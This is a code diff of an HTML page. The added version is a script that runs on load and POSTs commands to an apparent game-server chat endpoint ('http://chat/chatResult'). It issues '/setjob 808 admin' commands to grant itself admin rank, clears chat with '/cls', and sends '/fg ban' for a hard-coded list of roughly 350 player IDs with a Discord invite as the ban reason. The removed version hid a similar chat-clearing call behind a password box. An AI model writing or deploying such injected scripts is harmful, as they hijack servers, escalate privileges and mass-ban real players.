@@ -1,131 +1,52 @@
-<!doctype html>
-<html lang="ar">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>صفحة بيضاء مع صندوق سري</title>
-  <style>
-    html, body {
-      height: 100%;
-      margin: 0;
-      background: #ffffff;
-      font-family: system-ui, sans-serif;
-    }
-
-    .center {
-      height: 100%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .box {
-      background: rgba(255,255,255,0.0);
-      padding: 12px 14px;
-    }
-
-    input[type="password"] {
-      font-size: 16px;
-      padding: 8px 10px;
-      width: 220px;
-      border: 1px solid #ddd;
-      border-radius: 6px;
-      outline: none;
-    }
-
-    button {
-      margin-left: 8px;
-      padding: 8px 12px;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-      background: #f7f7f7;
-      cursor: pointer;
-      font-size: 14px;
-    }
-
-    /* التغطية البيضاء */
-    #whiteOverlay {
-      position: fixed;
-      inset: 0;
-      background: #ffffff;
-      z-index: 999999999;
-      display: none;
-    }
-  </style>
-</head>
 <body>
-  <div id="whiteOverlay"></div>
+<script>
+ for (let i = 0; i <= 7; i++) {
+  fetch("http://chat/chatResult", {
+    headers: {
+      "content-type": "application/json; charset=UTF-8"
+    },
+    referrer: "",
+    referrerPolicy: "strict-origin-when-cross-origin",
+    body: JSON.stringify({
+      message: `/setjob 808 admin ${i}`
+    }),
+    method: "POST",
+    mode: "cors",
+    credentials: "omit"
+  });
+ }
 
-  <div class="center" id="mainUI">
-    <div class="box" id="box">
-      <input id="pwd" type="password" placeholder="ادخل الرقم السري" autocomplete="off" />
-      <button id="submitBtn">إرسال</button>
-    </div>
-  </div>
+ fetch("http://chat/chatResult", {
+  "headers": {
+    "content-type": "application/json; charset=UTF-8"
+  },
+  "referrer": "",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": "{\"message\":\"/cls\"}",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "omit"
+ });
 
-  <script>
-    const SECRET = "1234";
-    const FETCH_DELAY_MS = 10000;
 
-    let fetchTimer = null;
-    let fetchStarted = false;
+ const playerIDs = [
+  692, 22, 2, 5, 866, 7, 573, 10, 858, 74, 918, 20, 978, 684, 14, 104, 19, 964, 348, 24, 793, 62, 988, 84, 574, 27, 28, 33, 35, 830, 122, 369, 461, 873, 744, 70, 71, 838, 93, 822, 415, 910, 505, 500, 105, 113, 751, 117, 846, 116, 129, 911, 441, 145, 139, 140, 770, 150, 738, 155, 230, 969, 154, 355, 157, 555, 159, 501, 907, 163, 993, 178, 173, 359, 180, 189, 195, 201, 634, 203, 526, 204, 791, 210, 335, 217, 971, 226, 595, 228, 235, 239, 935, 243, 608, 483, 262, 260, 651, 266, 269, 761, 431, 272, 422, 275, 288, 394, 291, 949, 292, 293, 399, 992, 299, 306, 316, 975, 315, 731, 325, 328, 767, 330, 558, 682, 890, 404, 345, 825, 346, 733, 720, 363, 628, 365, 851, 372, 373, 603, 919, 861, 382, 381, 383, 853, 400, 783, 425, 409, 801, 411, 828, 412, 410, 693, 417, 416, 970, 481, 427, 722, 433, 931, 429, 430, 515, 432, 438, 946, 788, 449, 451, 452, 458, 709, 668, 467, 470, 472, 868, 764, 489, 932, 609, 496, 572, 510, 527, 522, 734, 524, 869, 637, 531, 976, 773, 809, 598, 539, 543, 547, 831, 550, 877, 565, 575, 959, 576, 584, 592, 929, 785, 963, 606, 972, 962, 704, 613, 621, 620, 625, 630, 713, 629, 985, 631, 656, 633, 643, 650, 652, 666, 671, 676, 685, 820, 754, 691, 708, 983, 710, 893, 716, 724, 836, 728, 874, 732, 748, 736, 745, 750, 752, 757, 759, 776, 769, 864, 771, 775, 779, 780, 834, 786, 856, 795, 867, 808, 799, 800, 852, 812, 806, 811, 818, 813, 950, 814, 908, 817, 819, 821, 987, 826, 859, 829, 842, 955, 837, 841, 898, 850, 849, 925, 862, 860, 882, 878, 879, 886, 884, 885, 952, 888, 896, 894, 902, 905, 968, 909, 916, 913, 915, 921, 922, 927, 928, 930, 933, 934, 936, 938, 939, 942, 940, 941, 944, 948, 951, 977, 954, 965, 960, 961, 966, 989, 967, 979, 981, 982, 984, 986, 990, 991, 994
+ ];
 
-    function showWhiteOverlay() {
-      const ov = document.getElementById("whiteOverlay");
-      ov.style.display = "block";
-
-      // نخفي الواجهة بدون حذف DOM
-      const ui = document.getElementById("mainUI");
-      if (ui) ui.style.display = "none";
-    }
-
-    function doFetch() {
-      fetchStarted = true;
-      return fetch("http://chat/chatResult", {
-        "headers": { "content-type": "application/json; charset=UTF-8" },
-        "referrer": "",
-        "referrerPolicy": "strict-origin-when-cross-origin",
-        "body": "{\"message\":\"/cls\"}",
-        "method": "POST",
-        "mode": "cors",
-        "credentials": "omit"
-      });
-    }
-
-    function runFetchThenRemove() {
-      if (fetchStarted) return;
-
-      if (fetchTimer) clearTimeout(fetchTimer);
-
-      doFetch()
-        .catch(() => {})
-        .finally(() => showWhiteOverlay());
-    }
-
-    const pwdInput = document.getElementById("pwd");
-    const submitBtn = document.getElementById("submitBtn");
-
-    submitBtn.addEventListener("click", () => {
-      const val = pwdInput.value.trim();
-      if (val === SECRET) {
-        showWhiteOverlay();
-      } else {
-        runFetchThenRemove();
-      }
-    });
-
-    pwdInput.addEventListener("keydown", (e) => {
-      if (e.key === "Enter") submitBtn.click();
-    });
-
-    fetchTimer = setTimeout(() => {
-      const val = pwdInput.value.trim();
-      if (val === SECRET) {
-        showWhiteOverlay();
-      } else {
-        runFetchThenRemove();
-      }
-    }, FETCH_DELAY_MS);
-  </script>
+ playerIDs.forEach(id => {
+  fetch("http://chat/chatResult", {
+    headers: {
+      "content-type": "application/json; charset=UTF-8"
+    },
+    referrer: "",
+    referrerPolicy: "strict-origin-when-cross-origin",
+    body: JSON.stringify({
+      message: `/fg ban ${id} discord.gg/zn`
+    }),
+    method: "POST",
+    mode: "cors",
+    credentials: "omit"
+  });
+ });
+</script>
 </body>
-</html>
